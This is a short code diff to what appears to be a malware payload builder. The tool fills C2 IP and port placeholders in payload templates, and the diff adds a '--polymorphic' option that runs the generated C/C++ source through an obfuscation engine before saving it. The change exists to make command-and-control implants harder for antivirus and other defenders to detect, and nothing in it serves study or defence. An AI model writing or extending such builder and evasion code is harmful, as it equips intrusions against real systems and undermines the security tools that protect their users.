@@ -126,6 +126,7 @@ def main():
     build_parser.add_argument('--out', required=True, help='Output file for the generated payload source code.')
     build_parser.add_argument('--var1', required=True, help='Value for placeholder ##V1## (e.g., C2 IP).')
     build_parser.add_argument('--var2', required=True, help='Value for placeholder ##V2## (e.g., C2 Port).')
+    build_parser.add_argument('--polymorphic', action='store_true', help='Enable polymorphic obfuscation for C/C++ templates.')
 
     args = parser.parse_args()
 
@@ -145,6 +146,12 @@ def main():
                 tpl_data = f.read()
             
             p_code = tpl_data.replace('##V1##', args.var1).replace('##V2##', str(args.var2))
+
+            if args.polymorphic:
+                from polymorphic_engine import PolymorphicEngine
+                engine = PolymorphicEngine(p_code)
+                p_code = engine.obfuscate()
+                print("[+] Polymorphic obfuscation applied.")
 
             with open(args.out, 'w') as f:
                 f.write(p_code)
